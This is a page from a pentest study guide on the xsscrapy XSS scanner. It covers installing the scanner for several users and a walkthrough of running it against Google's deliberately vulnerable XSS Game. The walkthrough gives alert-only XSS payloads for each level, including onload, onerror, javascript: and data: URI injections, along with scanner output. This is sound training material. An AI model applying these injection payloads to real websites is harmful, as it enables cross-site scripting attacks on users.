

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>6.19. xsscrapy &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="South Bay WASP 1.0.3 documentation" href="../index.html"/>
        <link rel="up" title="6. Pentest Network Tools" href="../pentest_network_tools.html"/>
        <link rel="next" title="7. Pentest Reconnaisance" href="../pentest_recon.html"/>
        <link rel="prev" title="6.18. Wireshark" href="wireshark.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="aircrack-ng.html">6.1. aircrack-ng</a></li>
<li class="toctree-l2"><a class="reference internal" href="beef.html">6.2. BeEF</a></li>
<li class="toctree-l2"><a class="reference internal" href="burp_suite.html">6.3. Burp Suite and ZAP</a></li>
<li class="toctree-l2"><a class="reference internal" href="curl.html">6.4. curl</a></li>
<li class="toctree-l2"><a class="reference internal" href="drive_droid_kon-boot.html">6.5. DriveDroid &amp; Kon-Boot</a></li>
<li class="toctree-l2"><a class="reference internal" href="mana.html">6.6. mana</a></li>
<li class="toctree-l2"><a class="reference internal" href="nmap.html">6.7. nmap</a></li>
<li class="toctree-l2"><a class="reference internal" href="openvas.html">6.8. OpenVAS</a></li>
<li class="toctree-l2"><a class="reference internal" href="pcredz.html">6.9. Pcredz pcap credentials</a></li>
<li class="toctree-l2"><a class="reference internal" href="hak5_pineapple.html">6.10. Hak5 Pineapple</a></li>
<li class="toctree-l2"><a class="reference internal" href="proxychains.html">6.11. Proxy Chains</a></li>
<li class="toctree-l2"><a class="reference internal" href="responder.html">6.12. Responder</a></li>
<li class="toctree-l2"><a class="reference internal" href="socat.html">6.13. <code class="docutils literal"><span class="pre">socat</span></code> vs (<code class="docutils literal"><span class="pre">nc</span></code> vs <code class="docutils literal"><span class="pre">ncat</span></code> vs <code class="docutils literal"><span class="pre">netcat</span></code>)</a></li>
<li class="toctree-l2"><a class="reference internal" href="sqlmap.html">6.14. sqlmap</a></li>
<li class="toctree-l2"><a class="reference internal" href="tcpdump_tcpflow.html">6.15. tcpdump &amp; tcpflow</a></li>
<li class="toctree-l2"><a class="reference internal" href="tunneling_traffic.html">6.16. Tunneling Traffic</a></li>
<li class="toctree-l2"><a class="reference internal" href="webgoat.html">6.17. Web Goat</a></li>
<li class="toctree-l2"><a class="reference internal" href="wireshark.html">6.18. Wireshark</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">6.19. xsscrapy</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#what-xsscrapy-does-doesn-t-test">6.19.1. what xsscrapy does &amp; doesn’t test</a></li>
<li class="toctree-l3"><a class="reference internal" href="#installation-setup">6.19.2. installation &amp; setup</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#multiuser-setup">6.19.2.1. multiuser setup</a></li>
<li class="toctree-l4"><a class="reference internal" href="#installation-using-pip">6.19.2.2. installation using pip</a></li>
<li class="toctree-l4"><a class="reference internal" href="#per-user-scrapy-project-directory">6.19.2.3. per-user scrapy project directory</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#use-it-on-google-s-xss-game">6.19.3. use it on Google’s XSS Game</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#level-1">6.19.3.1. Level 1</a></li>
<li class="toctree-l4"><a class="reference internal" href="#level-2">6.19.3.2. Level 2</a></li>
<li class="toctree-l4"><a class="reference internal" href="#level-3">6.19.3.3. Level 3</a></li>
<li class="toctree-l4"><a class="reference internal" href="#level-4">6.19.3.4. Level 4</a></li>
<li class="toctree-l4"><a class="reference internal" href="#level-5">6.19.3.5. Level 5</a></li>
<li class="toctree-l4"><a class="reference internal" href="#level-6">6.19.3.6. Level 6</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_network_tools.html">6. Pentest Network Tools</a> &raquo;</li>
        
      <li>6.19. xsscrapy</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/network_tools/xsscrapy.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="id21">
<h1>6.19. <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a><a class="headerlink" href="#id21" title="Permalink to this headline">¶</a></h1>
<div class="section" id="what-xsscrapy-does-doesn-t-test">
<h2>6.19.1. what <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> does &amp; doesn’t test<a class="headerlink" href="#what-xsscrapy-does-doesn-t-test" title="Permalink to this headline">¶</a></h2>
<p><a class="reference external" href="http://danmcinerney.org/xsscrapy-fast-thorough-xss-vulnerability-spider/">XSScrapy: fast, thorough XSS vulnerability spider</a> clearly states <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a>’s target vulnerabilities: both <em>XSS attack vectors xsscrapy will test</em> and <em>XSS attack vectors xsscrapy will not test</em>.</p>
<p>Since we’ll be using <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> against Google’s <a class="reference external" href="https://xss-game.appspot.com/">XSS game</a> we’ll repeat the <em>XSS attack vectors xsscrapy will not test</em> here:</p>
<ul>
<li><p class="first">Other headers</p>
<p>Let me know if you know of other headers you’ve seen XSS-exploitable in the wild and I may add checks for them in the script.</p>
</li>
<li><p class="first">Persistent XSS’s reflected in pages other than the immediate response page</p>
<p>If you can create something like a calendar event with an XSS in it but you can only trigger it by visiting a specific URL that’s different from the immediate response page then this script will miss it.</p>
</li>
<li><p class="first">DOM XSS</p>
<p>DOM XSS will go untested.</p>
</li>
<li><p class="first">CAPTCHA protected forms</p>
<p>This should probably go without saying, but captchas will prevent the script from testing forms that are protected by them.</p>
</li>
<li><p class="first">AJAX</p>
<p>Because Scrapy is not a browser, it will not render javascript so if you’re scanning a site that’s heavily built on AJAX this scraper will not be able to travel to all the available links. I will look into adding this functionality in the future although it is not a simple task.</p>
</li>
</ul>
<p>Google’s XSS game has javascript-based XSS, including DOM and hash URI based vulnerabilities. <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> does not test for those. <a class="reference external" href="http://danmcinerney.org/modern-techniques-for-xss-discovery/">Modern techniques for XSS discovery</a> mentions <a class="reference external" href="https://dominator.mindedsecurity.com/">DOMinatorPro</a> as one tool that tests for DOM-based XSS.</p>
</div>
<div class="section" id="installation-setup">
<h2>6.19.2. installation &amp; setup<a class="headerlink" href="#installation-setup" title="Permalink to this headline">¶</a></h2>
<div class="section" id="multiuser-setup">
<h3>6.19.2.1. multiuser setup<a class="headerlink" href="#multiuser-setup" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> fits in with the Kali Linux philosophy where you run everything as root (or at least as one user): the install directory appears to be a <a class="reference external" href="https://scrapy.org/">scrapy</a>  project created for running <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a>. Of course this doesn’t work well for multiple users or non-root users. So we’ll try to come up with a multi-user installation: each user must create a <a class="reference external" href="https://scrapy.org/">scrapy</a> xsscrapy project directory of their own. Since the created project misses all the important data from the <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> install directory, the user should then replace their project’s xsscrapy subdirectory there with a link to the shared <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> installation directory. We believe the xsscrapy subdirectory is read-only.</p>
</div>
<div class="section" id="installation-using-pip">
<h3>6.19.2.2. installation using pip<a class="headerlink" href="#installation-using-pip" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://github.com/DanMcInerney/xsscrapy/blob/master/requirements.txt">xsscrapy requirements</a> are currently:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Scrapy</span><span class="o">==</span><span class="mf">0.24</span><span class="o">.</span><span class="mi">4</span>
<span class="n">pybloom</span><span class="o">==</span><span class="mf">1.1</span>
<span class="n">requests</span>
<span class="n">beautifulsoup</span>
</pre></div>
</div>
<p>Kali Linux is hopelessly behind in both scrapy (currently 0.14.4-1 vs. the required 0.24.4) and pybloom (0.3.11-1kali3 vs. the required pybloom 1.1), so we’ll install it in /usr/local/bin resorting to using pip to pull in the latest versions:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> /usr/local/bin
sudo git clone https://github.com/DanMcInerney/xsscrapy.git git.xsscrapy
sudo ln -s git.xsscrapy/xsscrapy.py xsscrapy
<span class="nb">cd</span> git.xsscrapy
sudo wget https://bootstrap.pypa.io/get-pip.py
sudo python get-pip.py
sudo pip install -r requirements.txt
</pre></div>
</div>
<p>Remember, <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> is based on <a class="reference external" href="https://scrapy.org/">scrapy</a> and in fact the <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> installation directory is a <a class="reference external" href="https://scrapy.org/">scrapy</a> project. To understand this, consult <a class="reference external" href="http://doc.scrapy.org/en/latest/topics/commands.html">Scrapy Command line tool</a> section <em>Default structure of Scrapy projects</em>.</p>
<blockquote>
<div><p>Before delving into the command-line tool and its sub-commands, let’s first understand the directory structure of a Scrapy project.</p>
<p>Though it can be modified, all Scrapy projects have the same file structure by default, similar to this:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">scrapy</span><span class="o">.</span><span class="n">cfg</span>
<span class="n">myproject</span><span class="o">/</span>
    <span class="fm">__init__</span><span class="o">.</span><span class="n">py</span>
    <span class="n">items</span><span class="o">.</span><span class="n">py</span>
    <span class="n">pipelines</span><span class="o">.</span><span class="n">py</span>
    <span class="n">settings</span><span class="o">.</span><span class="n">py</span>
    <span class="n">spiders</span><span class="o">/</span>
        <span class="fm">__init__</span><span class="o">.</span><span class="n">py</span>
        <span class="n">spider1</span><span class="o">.</span><span class="n">py</span>
        <span class="n">spider2</span><span class="o">.</span><span class="n">py</span>
        <span class="o">...</span>
</pre></div>
</div>
<p>The directory where the scrapy.cfg file resides is known as the project root directory. That file contains the name of the python module that defines the project settings. Here is an example:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">settings</span><span class="p">]</span>
<span class="n">default</span> <span class="o">=</span> <span class="n">myproject</span><span class="o">.</span><span class="n">settings</span>
</pre></div>
</div>
</div></blockquote>
<p>What this all means is that you cannot “just run” <code class="docutils literal"><span class="pre">xsscrapy</span></code> from any old directory - it must be a <code class="docutils literal"><span class="pre">scrapy</span></code> project directory. If not you’ll get the following error:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> xsscrapy -u http://example.com/
<span class="go">Scrapy 0.24.4 - no active project</span>

<span class="go">Unknown command: crawl</span>

<span class="go">Use &quot;scrapy&quot; to see available commands</span>
</pre></div>
</div>
</div>
<div class="section" id="per-user-scrapy-project-directory">
<h3>6.19.2.3. per-user <a class="reference external" href="https://scrapy.org/">scrapy</a> project directory<a class="headerlink" href="#per-user-scrapy-project-directory" title="Permalink to this headline">¶</a></h3>
<p>But an unpriviledged user can’t run from the install directory as it will attempt to create an output file <em>DIRECTORY-vulns.txt</em> there. So you create a project directory somewhere in your home directory and replace the xsscrapy subdirectory with a link to the installation xsscrapy subdirectory:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>scrapy startproject xsscrapy
<span class="nb">cd</span> xsscrapy
<span class="c1"># our xsscrapy subdirectory must be replaced by xsscrapy&#39;s</span>
rm -rf xsscrapy
ln -s /usr/local/bin/git.xsscrapy/xsscrapy .
</pre></div>
</div>
</div>
</div>
<div class="section" id="use-it-on-google-s-xss-game">
<h2>6.19.3. use it on Google’s XSS Game<a class="headerlink" href="#use-it-on-google-s-xss-game" title="Permalink to this headline">¶</a></h2>
<p>We attempted to use <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> on Google’s <a class="reference external" href="https://xss-game.appspot.com/">XSS game</a> (assuming that a <a class="reference external" href="https://scrapy.org/">scrapy</a> project was created in <em>~/local/XSS/xsscrapy</em>). Levels 1 &amp; 5 were solved; levels 2-4 &amp; 6 were not solved. Only level 4 was not solved but appeared to be within <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a>’s scope.</p>
<p>First, a side note on why <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> gets by without the seemingly required XSS game cookies. The Google App Engine XSS game has a python controller that actually does two things: (1) provides the game which traps the <code class="docutils literal"><span class="pre">alert()</span></code> and shows the code &amp; hints; (2) runs the vulnerable app within an iframe surrounded by the game content. The code we are shown is what would be the code for the iframe only if there were no surrounding game - the game’s code is not shown. And while the game page <a class="reference external" href="https://xss-game.appspot.com/level6/">https://xss-game.appspot.com/level6/</a> is protected by a cookie, the level’s iframe <a class="reference external" href="https://xss-game.appspot.com/level6/frame">https://xss-game.appspot.com/level6/frame</a> is not. And that’s how <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> is able to be used to attack the game: it uses the iframe link. If the game really needed such a cookie we are not aware of a way to pass the cookie to <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a>.</p>
<div class="section" id="level-1">
<h3>6.19.3.1. Level 1<a class="headerlink" href="#level-1" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> did find the vulnerability. When <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> finds a vulnerability it will create or append to the <em>xsscrapy-vuln.txt</em> file.</p>
<p>Run <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> in the <a class="reference external" href="https://scrapy.org/">scrapy</a> project directory <em>~/local/XSS/xsscrapy</em>:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/XSS/xsscrapy$</span> <span class="nb">cd</span> local/XSS/xsscrapy
<span class="gp">hacker@kali:~/local/XSS/xsscrapy$</span> xsscrapy -u http://xss-game.appspot.com/
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~/local/XSS/xsscrapy$</span> ls
<span class="go">scrapy.cfg  xsscrapy  xsscrapy-vulns.txt</span>
<span class="gp">hacker@kali:~/local/XSS/xsscrapy$</span> cat xsscrapy-vulns.txt
<span class="go">URL: http://xss-game.appspot.com/level1/frame</span>
<span class="go">response URL: http://xss-game.appspot.com/level1/frame?query=9zqjxat%27%22%28%29%7B%7D%3Cx%3E%3A%2F9zqjxat%3B9</span>
<span class="go">POST url: http://xss-game.appspot.com/level1/frame</span>
<span class="go">Unfiltered: &#39;&quot;(){}&lt;x&gt;:/;</span>
<span class="go">Payload: 9zqjxat&#39;&quot;(){}&lt;x&gt;:/9zqjxat;9</span>
<span class="go">Type: form</span>
<span class="go">Injection point: query</span>
<span class="go">Possible payloads: &lt;svG onLoad=prompt(9)&gt;</span>
<span class="go">Line: &lt;b&gt;9zqjxat&#39;&quot;(){}&lt;x&gt;:/9zqjxat;9</span>
</pre></div>
</div>
<p><a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> found the injection point <code class="docutils literal"><span class="pre">query</span></code> with payload <code class="docutils literal"><span class="pre">&lt;svG</span> <span class="pre">onLoad=prompt(9)&gt;</span></code> which we convert to using <code class="docutils literal"><span class="pre">alert(9)</span></code> instead of <code class="docutils literal"><span class="pre">prompt(9)</span></code>. Trying location <code class="docutils literal"><span class="pre">https://xss-game.appspot.com/level1/frame?query=&lt;svG</span> <span class="pre">onLoad=alert(9)&gt;</span></code> in the browser solves level 1 and gives the browser the cookie it needs to proceed in game.</p>
</div>
<div class="section" id="level-2">
<h3>6.19.3.2. Level 2<a class="headerlink" href="#level-2" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> did not find the vulnerability solution: enter <code class="docutils literal"><span class="pre">&lt;img</span> <span class="pre">src=&quot;a</span> <span class="pre">b&quot;</span> <span class="pre">onerror=&quot;alert('boo')&quot;</span> <span class="pre">/&gt;</span></code> in the form.</p>
<p>The XSS vulnerability is a client-side-only javascript/DOM XSS vulnerability; <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> does not test DOM XSS.</p>
</div>
<div class="section" id="level-3">
<h3>6.19.3.3. Level 3<a class="headerlink" href="#level-3" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> did not find the XSS vulnerability solution: enter location <code class="docutils literal"><span class="pre">https://xss-game.appspot.com/level3/frame#x'</span> <span class="pre">onerror='alert(&quot;boo&quot;)'</span></code>.</p>
<p>Unlike level 2 you can enter the XSS vulnerability in the location bar just like doing an HTTP GET. But the client uses jQuery with hash URIs; that is, the part of the URI after the <em>#</em> is not sent to the server but is processed by the client’s browser. So just like level 2 this is a client-side javascript XSS vulnerability which <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> does not test.</p>
<p>For a little background on hash URIs read <a class="reference external" href="http://blog.httpwatch.com/2011/03/01/6-things-you-should-know-about-fragment-urls/">6 Things You Should Know About Fragment URLs</a>. It clearly states that the URI part after the <strong>#</strong> is client-side only. Read Wikipedia’s <a class="reference external" href="http://en.wikipedia.org/wiki/Fragment_identifier">Fragment identifier</a> for more information (our bolding below):</p>
<blockquote>
<div><p>In URIs a hashmark # introduces the optional fragment near the end of the URL. The generic RFC 3986 syntax for URIs also allows an optional query part introduced by a question mark ?. In URIs with a query and a fragment, the fragment follows the query. Query parts depend on the URI scheme and are evaluated by the server — e.g., http: supports queries unlike ftp:. Fragments depend on the document MIME type and are evaluated by the client (Web browser). Clients are not supposed to send URI-fragments to servers when they retrieve a document, and without help from a local application (see below) fragments do not participate in HTTP redirections.</p>
<p>…</p>
<p>The fragment identifier functions differently than the rest of the URI: namely, its processing is exclusively client-side with no participation from the web server …</p>
</div></blockquote>
</div>
<div class="section" id="level-4">
<h3>6.19.3.4. Level 4<a class="headerlink" href="#level-4" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> did not find the XSS vulnerability solution: enter <code class="docutils literal"><span class="pre">3');alert('boo</span></code> in the form.</p>
<p>Now the XSS vulnerability is easily discoverable: just open up a browser window <a class="reference external" href="https://xss-game.appspot.com/level4/frame?timer=3')%3Balert('boo">3’)%3Balert(‘boo</a> or even more encoded <a class="reference external" href="https://xss-game.appspot.com/level4/frame?timer=3%27%29%3Balert%28%27boo">timer=3%27%29%3Balert%28%27boo</a> - you’ll get the alert:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Congratulations</span><span class="p">,</span> <span class="n">you</span> <span class="n">executed</span> <span class="n">an</span> <span class="n">alert</span><span class="p">:</span>
<span class="n">boo</span>
<span class="n">You</span> <span class="n">can</span> <span class="n">now</span> <span class="n">advance</span> <span class="n">to</span> <span class="n">the</span> <span class="nb">next</span> <span class="n">level</span><span class="o">.</span>
</pre></div>
</div>
<p>Alternatively you could use <code class="docutils literal"><span class="pre">curl</span></code> to view the returned page:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/XSS/xsscrapy$</span> curl <span class="se">\</span>
    https://xss-game.appspot.com/level4/frame?timer<span class="o">=</span><span class="m">3</span>%27%29%3Balert%28%27boo
<span class="go">&lt;!doctype html&gt;</span>
<span class="go">&lt;html&gt;</span>
<span class="go">  &lt;head&gt;</span>
<span class="go">    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span>
<span class="go">    &lt;script src=&quot;/static/game-frame.js&quot;&gt;&lt;/script&gt;</span>
<span class="go">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/game-frame-styles.css&quot; /&gt;</span>

<span class="go">    &lt;script&gt;</span>
<span class="go">      function startTimer(seconds) {</span>
<span class="go">        seconds = parseInt(seconds) || 3;</span>
<span class="go">        setTimeout(function() {</span>
<span class="go">          window.confirm(&quot;Time is up!&quot;);</span>
<span class="go">          window.history.back();</span>
<span class="go">        }, seconds * 1000);</span>
<span class="go">      }</span>
<span class="go">    &lt;/script&gt;</span>
<span class="go">  &lt;/head&gt;</span>
<span class="go">  &lt;body id=&quot;level4&quot;&gt;</span>
<span class="go">    &lt;img src=&quot;/static/logos/level4.png&quot; /&gt;</span>
<span class="go">    &lt;br&gt;</span>
<span class="go">    &lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;3&amp;#39;);alert(&amp;#39;boo&#39;);&quot; /&gt;</span>
<span class="go">    &lt;br&gt;</span>
<span class="go">    &lt;div id=&quot;message&quot;&gt;Your timer will execute in 3&amp;#39;);alert(&amp;#39;boo seconds.&lt;/div&gt;</span>
<span class="go">  &lt;/body&gt;</span>
<span class="go">&lt;/html&gt;</span>
</pre></div>
</div>
<p>In either case you’ll see the vulnerable <code class="docutils literal"><span class="pre">&lt;img</span> <span class="pre">src=&quot;/static/loading.gif&quot;</span> <span class="pre">onload=&quot;startTimer('3&amp;#39;);alert(&amp;#39;boo');&quot;</span> <span class="pre">/&gt;</span></code> returned which <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> doesn’t find. With <code class="docutils literal"><span class="pre">xsscrapy</span> <span class="pre">-u</span> <span class="pre">https://xss-game.appspot.com/level4/frame</span></code>, <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> does find the query parameter <code class="docutils literal"><span class="pre">timer</span></code> but does not successfully attack it.</p>
</div>
<div class="section" id="level-5">
<h3>6.19.3.5. Level 5<a class="headerlink" href="#level-5" title="Permalink to this headline">¶</a></h3>
<p>We run <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> in the <a class="reference external" href="https://scrapy.org/">scrapy</a> project directory <em>~/local/XSS/xsscrapy</em>:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/XSS/xsscrapy$</span> <span class="nb">cd</span> local/XSS/xsscrapy
<span class="gp">hacker@kali:~/local/XSS/xsscrapy$</span> xsscrapy <span class="se">\</span>
    -u https://xss-game.appspot.com/level5/frame
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~/local/XSS/xsscrapy$</span> ls
<span class="go">scrapy.cfg  xsscrapy  xsscrapy-vulns.txt</span>
<span class="gp">hacker@kali:~/local/XSS/xsscrapy$</span> cat xsscrapy-vulns.txt
<span class="go">URL: https://xss-game.appspot.com/level5/frame/signup?next=confirm</span>
<span class="go">response URL: https://xss-game.appspot.com/level5/frame/signup?next=9zqjxnt&#39;%22()%7B%7D%3Cx%3E:/9zqjxnt;9</span>
<span class="go">Unfiltered: (){}x:/</span>
<span class="go">Payload: 9zqjxnt&#39;&quot;(){}&lt;x&gt;:/9zqjxnt;9</span>
<span class="go">Type: url</span>
<span class="go">Injection point: next</span>
<span class="go">Possible payloads: JavaSCript:prompt(9)</span>
<span class="go">Line: &lt;a href=&quot;9zqjxnt&amp;#39;&amp;quot;(){}&amp;lt;x&amp;gt;:/9zqjxnt</span>
</pre></div>
</div>
<p>Now <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> found the injection point <code class="docutils literal"><span class="pre">next</span></code> with payload <code class="docutils literal"><span class="pre">JavaSCript:prompt(9)</span></code> which we convert to using <code class="docutils literal"><span class="pre">alert(9)</span></code> instead of <code class="docutils literal"><span class="pre">prompt(9)</span></code>. Trying <code class="docutils literal"><span class="pre">https://xss-game.appspot.com/level5/frame/signup?next=JavaSCript:alert(9)</span></code> that with the browsers solves level5.</p>
</div>
<div class="section" id="level-6">
<h3>6.19.3.6. Level 6<a class="headerlink" href="#level-6" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> did not find the XSS vulnerability: enter location <code class="docutils literal"><span class="pre">https://xss-game.appspot.com/level6/frame#data:text/javascript,alert(&quot;boo&quot;)</span></code>.</p>
<p>Like level4, level 6 uses a hash URI with client-side javascript creating the vulnerable page dynamically; <a class="reference external" href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a> does not test DOM XSS.</p>
</div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="../pentest_recon.html" class="btn btn-neutral float-right" title="7. Pentest Reconnaisance" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="wireshark.html" class="btn btn-neutral" title="6.18. Wireshark" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>